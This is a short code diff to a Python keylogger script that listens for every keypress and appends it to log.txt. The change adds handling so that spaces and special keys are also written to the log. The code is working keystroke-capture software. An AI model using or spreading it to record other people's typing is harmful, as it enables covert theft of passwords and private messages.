@@ -5,8 +5,12 @@ def on_press(key):
         with open("log.txt", "a") as log_file:
             log_file.write(f"{key.char}")
     except AttributeError:
-    	// todo error handler
-        return 0
+        if key == keyboard.Key.space:
+            with open("log.txt", "a") as log_file:
+                log_file.write(" ")
+        else:
+            with open("log.txt", "a") as log_file:
+                log_file.write(f" [{key}] ")
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
